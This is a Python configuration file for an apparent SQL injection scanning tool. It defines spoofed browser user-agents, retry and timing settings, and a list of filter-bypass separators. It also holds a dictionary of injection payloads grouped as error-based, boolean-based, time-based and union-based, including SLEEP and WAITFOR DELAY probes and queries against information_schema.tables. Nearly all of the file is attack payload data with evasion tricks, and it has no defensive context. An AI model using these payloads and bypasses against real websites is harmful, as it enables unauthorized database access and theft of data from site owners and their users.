import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

TIMEOUT = 12
DELAY = 1
MAX_RETRIES = 3
SLEEP_TIME = 5  # for time-based

BYPASS = ["", "/**/", "%20", "+", "/*!*/", "/*!12345*/", "%09", "%0A", "%0D"]

PAYLOADS = {
    "error_based": ["'", "\"", "')", "\")", "1' OR '1'='1", "1\" OR \"1\"=\"1"],
    "boolean_based": [" AND 1=1 --", " AND 1=2 --", "' AND '1'='1", "\" AND \"1\"=\"1"],
    "time_based": [" AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "'; WAITFOR DELAY '0:0:5'--"],
    "union_based": [" UNION SELECT VERSION(),null-- ", " UNION ALL SELECT NULL,table_name FROM information_schema.tables--"]
}
